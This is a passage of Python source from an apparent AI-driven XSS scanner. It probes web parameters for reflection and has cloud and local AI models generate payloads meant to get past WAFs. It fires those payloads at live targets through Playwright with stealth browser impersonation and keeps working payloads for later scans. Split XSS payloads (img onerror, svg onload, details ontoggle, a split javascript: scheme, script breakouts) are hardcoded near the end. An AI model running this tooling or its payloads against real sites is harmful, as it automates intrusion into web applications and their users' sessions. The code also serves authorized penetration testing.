        session_lessons.extend(build_behavior_lessons(behavior_profile))
        if _cached_context is not None:
            session_lessons.extend(build_mapping_lessons(
                _cached_context,
                memory_profile=memory_profile,
            ))
        if reflected:
            session_lessons.extend(build_probe_lessons(
                reflected,
                memory_profile=memory_profile,
                delivery_mode="get",
            ))
    except Exception as exc:
        log.debug("Session lesson build failed for %s: %s", url, exc)

    if not reflected:
        put_result(WorkerResult(
            url=url,
            status="no_reflection",
            waf=waf_hint,
            params_tested=len(flat_params),
            dead_target=True,
            dead_reason=(
                getattr(target_disposition, "reason", "")
                or "No reflection was confirmed during bounded discovery."
            ),
            target_tier=getattr(target_disposition, "tier", "hard_dead"),
        ))
        return

    if not injectable and not coordinated_attempts:
        put_result(WorkerResult(
            url=url,
            status="no_reflection",
            waf=waf_hint,
            params_tested=len(flat_params),
            params_reflected=len(reflected),
            dead_target=True,
            dead_reason=(
                getattr(target_disposition, "reason", "")
                or "Reflection exists, but no executable context was confirmed."
            ),
            target_tier=getattr(target_disposition, "tier", "soft_dead"),
        ))
        return

    # ── Step 5: Start Playwright executor (shared for all payload attempts) ──
    from ai_xss_generator.active.executor import ActiveExecutor
    executor = ActiveExecutor(auth_headers=auth_headers)
    try:
        executor.start()
    except Exception as exc:
        put_result(WorkerResult(
            url=url,
            status="error",
            error=f"Playwright start failed: {exc}",
            waf=waf_hint,
            target_tier=getattr(target_disposition, "tier", ""),
        ))
        return

    confirmed_findings: list[ConfirmedFinding] = []
    total_transforms_tried = 0
    cloud_escalated = False
    local_model_rounds = 0
    cloud_model_rounds = 0
    fallback_rounds = 0
    escalation_reasons: list[str] = []

    try:
        from ai_xss_generator.active.transforms import all_variants_for_probe

        # ── Step 5: Model-first execution per injectable param ────────────────
        for probe_result in injectable:
            if _timed_out():
                break

            param_name = probe_result.param_name
            param_variants = all_variants_for_probe(probe_result)

            for _pname, context_type, variants in param_variants:
                if _timed_out():
                    break

                context_probe_result = _probe_result_for_context(probe_result, context_type)
                from ai_xss_generator.behavior import derive_ai_escalation_policy

                escalation_policy = derive_ai_escalation_policy(
                    _cached_context,
                    delivery_mode="get",
                    context_type=context_type,
                )
                _append_reason(escalation_reasons, escalation_policy.note)
                cloud_plan = CloudPayloadPlan()
                context_done = False
                context_variant_keys: set[str] = set()
                # AI-tried payloads for this context — non-confirmed ones graduate
                # to tier-1 (survived) in the seed pool after the context loop ends.
                _ai_tried_payloads: list[tuple[str, str]] = []  # (payload, source)

                def _record_context_finding(finding: ConfirmedFinding) -> bool:
                    key = _finding_variant_key(finding)
                    if key in context_variant_keys:
                        return False
                    context_variant_keys.add(key)
                    confirmed_findings.append(finding)
                    # Tier-2 promotion: confirmed execution → highest-signal seed
                    try:
                        from ai_xss_generator.seed_pool import SeedPool
                        from ai_xss_generator.findings import infer_bypass_family as _ibf
                        SeedPool().add_confirmed(
                            finding.payload,
                            finding.context_type,
                            waf=finding.waf or "",
                            bypass_family=finding.bypass_family or _ibf(finding.payload, []),
                            surviving_chars=finding.surviving_chars,
                            source=finding.source,
                        )
                    except Exception:
                        pass
                    return True

                # Local model triage gate — decides whether this injection point
                # is worth cloud API spend. It does NOT generate payloads.
                # In --fast mode triage is skipped and cloud always runs.
                _triage_approved = True  # default when local model unavailable
                if escalation_policy.use_local and not context_done and not _timed_out():
                    local_model_rounds += 1
                    _triage = _triage_with_local_model(
                        probe_result=context_probe_result,
                        model=model,
                        waf=waf_hint,
                        delivery_mode="get",
                        fast_mode=fast,
                    )
                    _triage_approved = _triage.should_escalate
                    _append_reason(escalation_reasons, f"[triage score={_triage.score}] {_triage.reason}")
                    if _triage.context_notes:
                        _append_reason(escalation_reasons, _triage.context_notes)
                    if not _triage_approved:
                        log.debug(
                            "Triage gate: skipping cloud for %s param=%s (score=%d): %s",
                            url, param_name, _triage.score, _triage.reason,
                        )

                # Cloud model generates payloads — gated by local triage verdict.
                if not context_done and _triage_approved and use_cloud and not _timed_out():
                    # Each unique (endpoint + param + waf + char profile + context)
                    # combination gets exactly one cloud call.
                    surviving_chars = frozenset().union(
                        *(ctx.surviving_chars for ctx in context_probe_result.reflections)
                    )
                    attempt_limit = max(1, cloud_attempts)
                    ekey = _escalation_key(
                        url=url,
                        param_name=param_name,
                        waf=waf_hint,
                        surviving_chars=surviving_chars,
                        context_type=context_type,
                    )
                    cloud_feedback_lessons: list[Any] | None = None
                    seen_cloud_payloads: set[str] = set()
                    fast_generated_count = 0
                    fast_reflected_count = 0

                    for attempt_number in range(1, attempt_limit + 1):
                        if _timed_out():
                            break

                        cloud_escalated = True
                        cloud_model_rounds += 1
                        cloud_plan = _coerce_cloud_plan(_get_cloud_payloads(
                            url=url,
                            probe_result=context_probe_result,
                            cloud_model=cloud_model,
                            waf=waf_hint,
                            ekey=ekey,
                            dedup_registry=dedup_registry,
                            dedup_lock=dedup_lock,
                            base_context=_cached_context,
                            auth_headers=auth_headers,
                            ai_backend=ai_backend,
                            cli_tool=cli_tool,
                            cli_model=cli_model,
                            delivery_mode="get",
                            session_lessons=session_lessons,
                            feedback_lessons=cloud_feedback_lessons,
                            phase_profile=phase_profile,
                            deep=deep,
                        ))
                        cloud_payloads, duplicate_payloads = _unique_new_payloads(
                            cloud_plan.payloads,
                            seen_cloud_payloads,
                        )
                        fast_generated_count += len(cloud_payloads)

                        failed_results: list[Any] = []
                        for cp in cloud_payloads:
                            if _timed_out():
                                break
                            total_transforms_tried += 1
                            _cp_text = _payload_text(cp)
                            result = executor.fire(
                                url=url,
                                param_name=param_name,
                                payload=_cp_text,
                                all_params=flat_params,
                                transform_name="cloud_model",
                                sink_url=sink_url,
                                payload_candidate=cp,
                            )
                            _ai_tried_payloads.append((_cp_text, "cloud_model"))
                            if result.confirmed:
                                finding = _make_finding(
                                    url=url,
                                    probe_result=context_probe_result,
                                    context_type=context_type,
                                    result=result,
                                    waf=waf_hint,
                                    source="cloud_model",
                                    cloud_escalated=True,
                                    ai_engine=cloud_plan.engine,
                                    ai_note=_merge_ai_notes(
                                        escalation_policy.note,
                                        _cloud_attempt_note(
                                            cloud_plan.note,
                                            attempt_number,
                                            attempt_limit,
                                        ),
                                    ),
                                )
                                if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                    context_done = True
                                    break
                            failed_results.append(result)

                        cloud_feedback_lessons = _build_cloud_feedback_lessons(
                            attempt_number=attempt_number,
                            total_attempts=attempt_limit,
                            prompt_context=_cached_context,
                            delivery_mode="get",
                            context_type=context_type,
                            sink_context=context_type,
                            payloads_tried=cloud_payloads,
                            execution_results=failed_results,
                            duplicate_payloads=duplicate_payloads,
                            observation=_summarize_failed_execution_results(failed_results),
                        )
                        fast_reflected_count += _reflected_payload_count(failed_results, len(cloud_payloads))
                        if context_done or attempt_number >= attempt_limit:
                            break

                    if not context_done and not deep and not _timed_out() and fast_generated_count > 0:
                        _esc = _build_deep_escalation_plan(
                            url=url,
                            probe_result=context_probe_result,
                            delivery_mode="get",
                            context=_cached_context,
                            cloud_model=cloud_model,
                            waf_hint=waf_hint,
                            ekey=ekey,
                            dedup_registry=dedup_registry,
                            dedup_lock=dedup_lock,
                            auth_headers=auth_headers,
                            ai_backend=ai_backend,
                            cli_tool=cli_tool,
                            cli_model=cli_model,
                            session_lessons=session_lessons,
                            feedback_lessons=cloud_feedback_lessons,
                            phase_profile=phase_profile,
                            fast_generated_count=fast_generated_count,
                            fast_reflected_count=fast_reflected_count,
                        )
                        cloud_model_rounds += _esc.cloud_model_rounds_used
                        cloud_plan = _esc.cloud_plan
                        cloud_payloads, _ = _unique_new_payloads(
                            cloud_plan.payloads,
                            seen_cloud_payloads,
                        )
                        for cp in cloud_payloads:
                            if _timed_out():
                                break
                            total_transforms_tried += 1
                            result = executor.fire(
                                url=url,
                                param_name=param_name,
                                payload=_payload_text(cp),
                                all_params=flat_params,
                                transform_name="cloud_model",
                                sink_url=sink_url,
                                payload_candidate=cp,
                            )
                            if result.confirmed:
                                finding = _make_finding(
                                    url=url,
                                    probe_result=context_probe_result,
                                    context_type=context_type,
                                    result=result,
                                    waf=waf_hint,
                                    source="cloud_model",
                                    cloud_escalated=True,
                                    ai_engine=cloud_plan.engine,
                                    ai_note=_merge_ai_notes(
                                        escalation_policy.note,
                                        "Deep escalation after scout attempts exhausted.",
                                        cloud_plan.note,
                                    ),
                                )
                                if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                    context_done = True
                                    break

                if not context_done and waf_hint and not _timed_out():
                    waf_payloads = _waf_reference_payloads(waf_hint, context_probe_result, limit=4)
                    if waf_payloads:
                        fallback_rounds += 1
                        _append_reason(
                            escalation_reasons,
                            f"Inserted bounded {waf_hint} WAF-specific fallback candidates before generic transforms.",
                        )
                    for wp in waf_payloads:
                        if _timed_out():
                            break
                        total_transforms_tried += 1
                        result = executor.fire(
                            url=url,
                            param_name=param_name,
                            payload=_payload_text(wp),
                            all_params=flat_params,
                            transform_name="waf_payload",
                            sink_url=sink_url,
                            payload_candidate=wp,
                        )
                        if result.confirmed:
                            finding = _make_finding(
                                url=url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_waf_fallback",
                                cloud_escalated=cloud_escalated,
                                ai_note=f"Bounded {waf_hint} WAF-specific fallback candidate confirmed execution.",
                            )
                            if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                context_done = True
                                break

                # Deterministic transforms are now a fallback stage instead of
                # the primary search strategy.
                if not context_done and not _timed_out():
                    fallback_rounds += 1
                    for variant in variants:
                        if _timed_out():
                            break

                        total_transforms_tried += 1
                        result = executor.fire(
                            url=url,
                            param_name=param_name,
                            payload=variant.payload,
                            all_params=flat_params,
                            transform_name=variant.transform_name,
                            sink_url=sink_url,
                        )

                        if result.confirmed:
                            finding = _make_finding(
                                url=url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_transform",
                                cloud_escalated=False,
                                ai_note=_merge_ai_notes(
                                    escalation_policy.note,
                                    cloud_plan.note if use_cloud else "",
                                ),
                            )
                            if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                context_done = True
                                break

                # Tier-1 promotion: AI-tried payloads at a reflective context
                # that didn't confirm execution graduate to "survived" seeds.
                # This means future scans get real-target-tested payloads as seeds
                # even before any execution is confirmed (solves cold-start).
                _has_reflection = bool(getattr(context_probe_result, "reflections", None))
                if _has_reflection and _ai_tried_payloads:
                    _confirmed_texts = {f.payload for f in confirmed_findings}
                    _surviving = "".join(sorted(
                        c for ctx in context_probe_result.reflections
                        for c in ctx.surviving_chars
                    ))
                    try:
                        from ai_xss_generator.seed_pool import SeedPool
                        from ai_xss_generator.findings import infer_bypass_family as _ibf
                        _pool = SeedPool()
                        for _p_text, _p_src in _ai_tried_payloads:
                            if _p_text and _p_text not in _confirmed_texts:
                                _pool.add_survived(
                                    _p_text,
                                    context_type,
                                    waf=waf_hint or "",
                                    bypass_family=_ibf(_p_text, []),
                                    surviving_chars=_surviving,
                                    source=_p_src,
                                )
                    except Exception:
                        pass

        if not confirmed_findings and not _timed_out():
            for attempt in coordinated_attempts:
                if _timed_out():
                    break
                fallback_rounds += 1
                ordered_params = list(attempt.param_payloads.keys())
                primary_param = ordered_params[0]
                total_transforms_tried += 1
                result = executor.fire(
                    url=url,
                    param_name=primary_param,
                    payload=attempt.param_payloads[primary_param],
                    all_params=flat_params,
                    transform_name=attempt.transform_name,
                    sink_url=sink_url,
                    payload_overrides=attempt.param_payloads,
                )
                if result.confirmed:
                    confirmed_findings.append(_make_coordinated_finding(
                        url=url,
                        probe_results=reflected,
                        attempt=attempt,
                        result=result,
                        waf=waf_hint,
                    ))
                    break

    finally:
        executor.stop()

    status = "confirmed" if confirmed_findings else "no_execution"
    put_result(WorkerResult(
        url=url,
        status=status,
        confirmed_findings=confirmed_findings,
        transforms_tried=total_transforms_tried,
        cloud_escalated=cloud_escalated,
        waf=waf_hint,
        params_tested=len(flat_params),
        params_reflected=len(reflected),
        kind="get",
        target_tier=getattr(target_disposition, "tier", "live"),
        local_model_rounds=local_model_rounds,
        cloud_model_rounds=cloud_model_rounds,
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_finding(
    url: str,
    probe_result: Any,
    context_type: str,
    result: Any,
    waf: str | None,
    source: str,
    cloud_escalated: bool,
    ai_engine: str = "",
    ai_note: str = "",
) -> ConfirmedFinding:
    surviving = "".join(sorted(
        c for ctx in probe_result.reflections for c in ctx.surviving_chars
    ))
    return ConfirmedFinding(
        url=url,
        param_name=probe_result.param_name,
        context_type=context_type,
        sink_context=context_type,
        payload=result.payload,
        transform_name=result.transform_name,
        execution_method=result.method,
        execution_detail=result.detail,
        waf=waf,
        surviving_chars=surviving,
        fired_url=result.fired_url,
        source=source,
        cloud_escalated=cloud_escalated,
        ai_engine=ai_engine,
        ai_note=ai_note,
        bypass_family=infer_bypass_family(result.payload, []),
    )


def _make_coordinated_finding(
    *,
    url: str,
    probe_results: list[Any],
    attempt: CoordinatedPayloadAttempt,
    result: Any,
    waf: str | None,
) -> ConfirmedFinding:
    ordered_params = list(attempt.param_payloads.keys())
    payload_summary = "\n".join(
        f"{param}={attempt.param_payloads[param]}"
        for param in ordered_params
    )
    return ConfirmedFinding(
        url=url,
        param_name="+".join(ordered_params),
        context_type=attempt.context_type,
        sink_context=attempt.context_type,
        payload=payload_summary,
        transform_name=attempt.transform_name,
        execution_method=result.method,
        execution_detail=(
            f"Coordinated multi-parameter payload confirmed across {', '.join(ordered_params)}. "
            f"{result.detail}"
        ).strip(),
        waf=waf,
        surviving_chars=_coordinated_surviving_chars(probe_results, attempt.context_type),
        fired_url=result.fired_url,
        source="phase1_transform",
        cloud_escalated=False,
        bypass_family=infer_bypass_family(payload_summary, []),
    )


def _probe_result_for_context(probe_result: Any, context_type: str) -> Any:
    """Return a lightweight probe result containing only one reflection context."""
    from ai_xss_generator.types import DomSink

    reflections = [
        ctx for ctx in getattr(probe_result, "reflections", [])
        if getattr(ctx, "context_type", "") == context_type
    ]
    if not reflections:
        reflections = list(getattr(probe_result, "reflections", []))

    param_name = getattr(probe_result, "param_name", "")

    def _to_sinks() -> list[DomSink]:
        sinks: list[DomSink] = []
        for ctx in reflections:
            sink_name = f"probe:{getattr(ctx, 'context_type', '')}"
            attr_name = str(getattr(ctx, "attr_name", "") or "")
            if attr_name:
                sink_name += f":{attr_name}"
            surviving_chars = getattr(ctx, "surviving_chars", frozenset()) or frozenset()
            chars_note = f" surviving={sorted(surviving_chars)!r}" if surviving_chars else ""
            short_label = str(getattr(ctx, "short_label", getattr(ctx, "context_type", "")))
            sinks.append(
                DomSink(
                    sink=sink_name,
                    source=f"param={param_name!r} confirmed via active probe → {short_label}{chars_note}",
                    location=f"active_probe:param:{param_name}",
                    confidence=0.99 if surviving_chars else 0.88,
                )
            )
        return sinks

    return SimpleNamespace(
        param_name=param_name,
        original_value=getattr(probe_result, "original_value", ""),
        reflections=reflections,
        is_reflected=bool(reflections) and not getattr(probe_result, "error", None),
        is_injectable=bool(reflections) and any(
            bool(getattr(ctx, "surviving_chars", frozenset()) or frozenset())
            for ctx in reflections
        ),
        discovery_style=getattr(probe_result, "discovery_style", ""),
        reflection_transform=getattr(probe_result, "reflection_transform", ""),
        probe_mode=getattr(probe_result, "probe_mode", ""),
        tested_chars=getattr(probe_result, "tested_chars", ""),
        to_sinks=_to_sinks,
        error=getattr(probe_result, "error", None),
    )


def _sink_reflection_from_html(
    url: str,
    html: str,
    canary: str,
) -> tuple[str, Any, str] | None:
    from ai_xss_generator.probe import _analyze_char_survival, _clone_reflection_context, _find_reflections

    reflections = _find_reflections(html, canary)
    if not reflections:
        return None
    surviving = _analyze_char_survival(html, canary)
    normalized = [
        _clone_reflection_context(
            ctx,
            surviving_chars=surviving or (getattr(ctx, "surviving_chars", frozenset()) or frozenset()),
        )
        for ctx in reflections
    ]
    best = next((ctx for ctx in normalized if getattr(ctx, "is_exploitable", False)), normalized[0])
    return url, best, html


def _fetch_sink_reflection(
    session: Any,
    sink_url: str,
    canary: str,
    auth_headers: dict[str, str] | None = None,
) -> tuple[str, Any, str] | None:
    from ai_xss_generator.probe import _resp_html, _session_get

    req_kwargs: dict[str, Any] = {
        "headers": {
            **(auth_headers or {}),
            "User-Agent": "axss/0.1 (+authorized security testing; scrapling)",
        }
    }
    try:
        response = _session_get(session, sink_url, req_kwargs)
    except Exception as exc:
        log.debug("Stored sink fetch failed for %s: %s", sink_url, exc)
        return None
    return _sink_reflection_from_html(sink_url, _resp_html(response), canary)


def _discover_sink_context_from_crawled_pages(
    session: Any,
    canary: str,
    crawled_pages: list[str] | None,
    auth_headers: dict[str, str] | None = None,
) -> tuple[str, Any, str] | None:
    for candidate in list(dict.fromkeys(crawled_pages or [])):
        result = _fetch_sink_reflection(session, candidate, canary, auth_headers)
        if result is not None:
            return result
    return None


def _discover_sink_from_crawled_pages(
    session: Any,
    canary: str,
    crawled_pages: list[str] | None,
    auth_headers: dict[str, str] | None = None,
) -> tuple[str, str, str] | None:
    result = _discover_sink_context_from_crawled_pages(
        session,
        canary,
        crawled_pages,
        auth_headers,
    )
    if result is None:
        return None
    sink_url, reflection, _html = result
    surviving_chars = "".join(sorted(getattr(reflection, "surviving_chars", frozenset()) or frozenset()))
    return sink_url, str(getattr(reflection, "context_type", "") or ""), surviving_chars


def _override_probe_results_with_sink_reflection(
    probe_results: list[Any],
    param_names: list[str],
    sink_reflection: Any,
) -> list[Any]:
    from ai_xss_generator.probe import PROBE_CHARS, ProbeResult, _clone_reflection_context

    overridden: list[Any] = []
    existing_by_param = {
        str(getattr(result, "param_name", "") or ""): result
        for result in probe_results
        if str(getattr(result, "param_name", "") or "")
    }
    target_params = [str(name or "") for name in (param_names or []) if str(name or "").strip()]
    if not target_params:
        target_params = list(existing_by_param.keys())

    for param_name in target_params:
        existing = existing_by_param.get(param_name)
        overridden.append(
            ProbeResult(
                param_name=param_name,
                original_value=str(getattr(existing, "original_value", "") or ""),
                reflections=[
                    _clone_reflection_context(
                        sink_reflection,
                        surviving_chars=getattr(sink_reflection, "surviving_chars", frozenset()) or frozenset(),
                    )
                ],
                error=None,
                reflection_transform=str(getattr(existing, "reflection_transform", "") or ""),
                discovery_style=str(getattr(existing, "discovery_style", "") or "stored_sink"),
                probe_mode=str(getattr(existing, "probe_mode", "") or "stored_sink"),
                tested_chars=str(getattr(existing, "tested_chars", "") or PROBE_CHARS),
            )
        )
    return overridden


def _autodiscover_post_sink_context(
    *,
    executor: Any,
    post_form: Any,
    manual_sink_url: str | None,
    crawled_pages: list[str] | None,
    auth_headers: dict[str, str] | None,
    waf_hint: str | None,
) -> tuple[str, Any | None, Any | None]:
    from scrapling.fetchers import FetcherSession
    from ai_xss_generator.parser import parse_target
    from ai_xss_generator.probe import PROBE_CHARS, _PROBE_CLOSE, _PROBE_OPEN, _make_canary

    canary = _make_canary()
    discovery_payload = canary + _PROBE_OPEN + PROBE_CHARS + _PROBE_CLOSE
    discovery_param = post_form.param_names[0] if post_form.param_names else ""
    discovery_result = executor.fire_post(
        source_page_url=post_form.source_page_url,
        action_url=post_form.action_url,
        param_name=discovery_param,
        payload=discovery_payload,
        all_param_names=post_form.param_names,
        csrf_field=post_form.csrf_field,
        transform_name="sink_discovery",
        sink_url=manual_sink_url,
    )

    resolved_sink_url = manual_sink_url or str(getattr(discovery_result, "discovered_sink_url", "") or "")
    sink_reflection_data: tuple[str, Any, str] | None = None
    with FetcherSession(
        impersonate="chrome",
        stealthy_headers=True,
        timeout=20,
        follow_redirects=True,
        retries=1,
    ) as session:
        if resolved_sink_url:
            sink_reflection_data = _fetch_sink_reflection(
                session,
                resolved_sink_url,
                canary,
                auth_headers,
            )
        if sink_reflection_data is None and not manual_sink_url:
            sink_reflection_data = _discover_sink_context_from_crawled_pages(
                session,
                canary,
                crawled_pages,
                auth_headers,
            )

    if sink_reflection_data is None:
        return resolved_sink_url, None, None

    resolved_sink_url, sink_reflection, sink_html = sink_reflection_data
    parsed_sink_context: Any | None = None
    try:
        parsed_sink_context = parse_target(
            url=resolved_sink_url,
            html_value=None,
            waf=waf_hint,
            auth_headers=auth_headers,
            cached_html=sink_html,
        )
    except Exception as exc:
        log.debug("Stored sink parse failed for %s: %s", resolved_sink_url, exc)
    return resolved_sink_url, sink_reflection, parsed_sink_context


def _payload_matches_context(payload: str, context_type: str, attr_name: str = "") -> bool:
    lowered = payload.lower()
    has_markup = any(token in lowered for token in ("<", "&#60;", "\\u003c", "%3c"))
    has_uri = any(token in lowered for token in ("javascript:", "data:", "srcdoc", "java\t", "java\r", "java&#9;", "jav&#x0a;"))
    has_js = any(token in lowered for token in ("alert", "confirm", "constructor", "eval", "prompt"))
    normalized_context = context_type.strip().lower()
    normalized_attr = attr_name.strip().lower()

    if normalized_context in {"html_body", "html_comment"}:
        return has_markup
    if normalized_context == "html_attr_url":
        if normalized_attr == "srcdoc":
            return has_markup or "srcdoc" in lowered
        return has_uri and not has_markup
    if normalized_context == "html_attr_value":
        return has_markup or lowered.startswith(("'", "\"")) or any(token in lowered for token in ("onfocus", "onload", "ontoggle", "onerror"))
    if normalized_context == "html_attr_event":
        return has_js and not has_markup
    if normalized_context.startswith("js_") or normalized_context == "json_value":
        return has_js and not has_markup
    return True


def _coerce_waf_payload_for_context(candidate: Any, context_type: str, attr_name: str = "") -> Any:
    payload = _payload_text(candidate).strip()
    normalized_context = context_type.strip().lower()
    normalized_attr = attr_name.strip().lower()

    if normalized_context == "html_attr_url" and payload and "<" in payload:
        if normalized_attr == "srcdoc":
            match = re.search(r"srcdoc\s*=\s*['\"]([^'\"]+)['\"]", payload, flags=re.IGNORECASE)
            if match:
                return replace(candidate, payload=match.group(1))
            return candidate

        match = re.search(
            r"(?:href|src|action|formaction|data)\s*=\s*['\"]?([^'\"\s>]+(?:[^'\">]*[^'\"\s>])?)",
            payload,
            flags=re.IGNORECASE,
        )
        if match:
            return replace(candidate, payload=match.group(1))
    return candidate


def _waf_reference_payloads(
    waf: str | None,
    probe_result: Any,
    *,
    limit: int = 6,
) -> list[Any]:
    if not waf:
        return []
    try:
        from ai_xss_generator.public_payloads import _waf_candidates
    except Exception:
        return []

    reflections = list(getattr(probe_result, "reflections", []) or [])
    context_type = str(getattr(reflections[0], "context_type", "") or "") if reflections else ""
    attr_name = str(getattr(reflections[0], "attr_name", "") or "") if reflections else ""
    seen: set[str] = set()
    selected: list[Any] = []
    for candidate in _waf_candidates(waf):
        candidate = _coerce_waf_payload_for_context(candidate, context_type, attr_name)
        payload = _payload_text(candidate).strip()
        if not payload or payload in seen:
            continue
        if not _payload_matches_context(payload, context_type, attr_name):
            continue
        seen.add(payload)
        selected.append(candidate)
        if len(selected) >= limit:
            break
    return selected


def _get_local_payloads(
    url: str,
    probe_result: Any,
    model: str,
    waf: str | None,
    base_context: Any = None,
    auth_headers: dict[str, str] | None = None,
    delivery_mode: str = "get",
    session_lessons: list[Any] | None = None,
    local_timeout_seconds: int = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS,
) -> list[Any]:
    """Ask the local model for payloads. Returns AI payload candidates.

    *base_context* is a pre-parsed ParsedContext for *url*. When provided it
    avoids a redundant HTTP fetch — enrich_context adds the probe-specific
    reflection data on top without mutating the original.
    """
    try:
        from ai_xss_generator.probe import enrich_context
        from ai_xss_generator.models import generate_payloads
        from ai_xss_generator.learning import build_memory_profile

        if base_context is None:
            from ai_xss_generator.parser import parse_target
            base_context = parse_target(url=url, html_value=None, waf=waf, auth_headers=auth_headers)

        context = enrich_context(base_context, [probe_result])
        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode=delivery_mode,
        )
        payloads, engine, *_ = generate_payloads(
            context=context,
            model=model,
            waf=waf,
            use_cloud=False,  # local only at this step
            memory_profile=memory_profile,
            past_lessons=session_lessons,
            local_timeout_seconds=local_timeout_seconds,
        )
        if engine == "heuristic":
            return []
        return [
            p
            for p in payloads
            if getattr(p, "payload", "") and getattr(p, "source", "heuristic") != "heuristic"
        ]
    except Exception as exc:
        log.debug("Local model failed for %s param=%s: %s", url, probe_result.param_name, exc)
        return []


def _inject_dom_source(url: str, source_type: str, source_name: str, value: str) -> str:
    """Return *url* with *value* injected into the specified DOM-controlled source."""
    from ai_xss_generator.active.dom_xss import _inject_source
    return _inject_source(url, source_type, source_name, value)


def _dom_reference_payloads_for_sink(sink: str) -> list[dict[str, Any]]:
    from ai_xss_generator.active.dom_xss import fallback_payloads_for_sink

    normalized_sink = str(sink or "").strip()
    sink_tag = normalized_sink.lower() or "dom"
    if sink_tag in {"innerhtml", "outerhtml", "insertadjacenthtml", "document.write", "document.writeln"}:
        base_tags = ["dom_xss", "html", "auto-trigger", sink_tag]
    elif sink_tag in {"eval", "function", "settimeout", "setinterval"}:
        base_tags = ["dom_xss", "js-context", "execution", sink_tag]
    else:
        base_tags = ["dom_xss", "seed", sink_tag]

    references: list[dict[str, Any]] = []
    seen_payloads: set[str] = set()
    for payload in fallback_payloads_for_sink(normalized_sink)[:6]:
        payload_text = str(payload or "").strip()
        if not payload_text or payload_text in seen_payloads:
            continue
        seen_payloads.add(payload_text)
        references.append({
            "payload": payload_text,
            "bypass_family": infer_bypass_family(payload_text, base_tags),
            "tags": list(base_tags),
        })
    return references


def _dom_sink_from_context(context: Any) -> str:
    dom_sinks = list(getattr(context, "dom_sinks", []) or [])
    if dom_sinks:
        return str(getattr(dom_sinks[0], "sink", "") or "")
    prefix = "[dom:TAINT] "
    for note in list(getattr(context, "notes", []) or []):
        if not str(note).startswith(prefix):
            continue
        try:
            payload = json.loads(str(note)[len(prefix):])
        except Exception:
            continue
        sink = str(payload.get("sink", "") or "").strip()
        if sink:
            return sink
    return ""


def _cloud_note_for_engine(
    *,
    ai_backend: str,
    requested_cli_tool: str,
    engine: str,
) -> str:
    """Return a human-readable note when CLI cloud execution used failover."""
    if ai_backend != "cli":
        return ""
    actual_tool = engine.removeprefix("cli:")
    if not engine.startswith("cli:") or actual_tool == requested_cli_tool:
        return ""
    return f"CLI failover: requested {requested_cli_tool}, used {actual_tool}."


def _coerce_cloud_plan(value: Any) -> CloudPayloadPlan:
    """Normalize legacy/raw mocked cloud responses into CloudPayloadPlan."""
    from ai_xss_generator.types import PayloadCandidate

    if isinstance(value, CloudPayloadPlan):
        return value
    if isinstance(value, dict):
        payload_items = []
        for item in value.get("payloads", []):
            if isinstance(item, PayloadCandidate):
                payload_items.append(item)
            elif isinstance(item, dict):
                strategy = item.get("strategy")
                payload_items.append(PayloadCandidate(
                    payload=str(item.get("payload", "")).strip(),
                    title=str(item.get("title", "AI-generated payload")).strip() or "AI-generated payload",
                    explanation=str(item.get("explanation", "Tailored by model output.")).strip(),
                    test_vector=str(item.get("test_vector", "Inject into the highest-confidence sink.")).strip(),
                    tags=[str(tag) for tag in item.get("tags", []) if str(tag).strip()],
                    target_sink=str(item.get("target_sink", "")).strip(),
                    framework_hint=str(item.get("framework_hint", "")).strip(),
                    bypass_family=str(item.get("bypass_family", "")).strip(),
                    risk_score=int(item.get("risk_score", 0) or 0),
                    source=str(item.get("source", "heuristic") or "heuristic"),
                    strategy=strategy,
                ))
            elif item:
                payload_items.append(PayloadCandidate(
                    payload=str(item),
                    title="AI-generated payload",
                    explanation="Tailored by model output.",
                    test_vector="Inject into the highest-confidence sink.",
                    source="heuristic",
                ))
        return CloudPayloadPlan(
            payloads=payload_items,
            engine=str(value.get("engine", "")),
            note=str(value.get("note", "")),
        )
    if isinstance(value, list):
        return CloudPayloadPlan(payloads=list(value))
    return CloudPayloadPlan()


def _merge_ai_notes(*notes: str) -> str:
    merged = [note.strip() for note in notes if note and note.strip()]
    return " ".join(merged)


def _dom_hit_priority(hit: Any) -> tuple[int, str, str]:
    """Prefer client-only DOM sources before server-visible URL params."""
    source_rank = {
        "fragment": 0,
        "hash": 0,
        "query_param": 1,
    }
    return (
        source_rank.get(str(getattr(hit, "source_type", "")), 5),
        str(getattr(hit, "sink", "")),
        str(getattr(hit, "source_name", "")),
    )


def _split_attempts_for_context(context_type: str, first_param: str, second_param: str) -> list[CoordinatedPayloadAttempt]:
    attempts: list[CoordinatedPayloadAttempt] = []
    if context_type in {"html_body", "html_comment"}:
        attempts.extend([
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<img/src=x", second_param: "onerror=alert(1)>"},
                transform_name="split_img_onerror",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<svg", second_param: "onload=alert(1)>"},
                transform_name="split_svg_onload",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<details/open", second_param: "ontoggle=alert(1)>"},
                transform_name="split_details_toggle",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "<a/href=java", second_param: "script:alert(1)>x</a>"},
                transform_name="split_href_scheme",
            ),
        ])
    elif context_type in {"js_code", "js_string_dq", "js_string_sq", "js_string_bt", "json_value"}:
        attempts.extend([
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "</script><script>", second_param: "alert(1)</script>"},
                transform_name="split_script_breakout",
            ),
            CoordinatedPayloadAttempt(
                context_type=context_type,
                param_payloads={first_param: "</script><script>", second_param: "alert(1)//"},
                transform_name="split_script_comment",
            ),
        ])
    return attempts


def _coordinated_split_attempts(probe_results: list[Any]) -> list[CoordinatedPayloadAttempt]:
    context_to_params: dict[str, list[str]] = {}
    for probe_result in probe_results:
        seen_contexts: set[str] = set()
        for reflection in getattr(probe_result, "reflections", []):
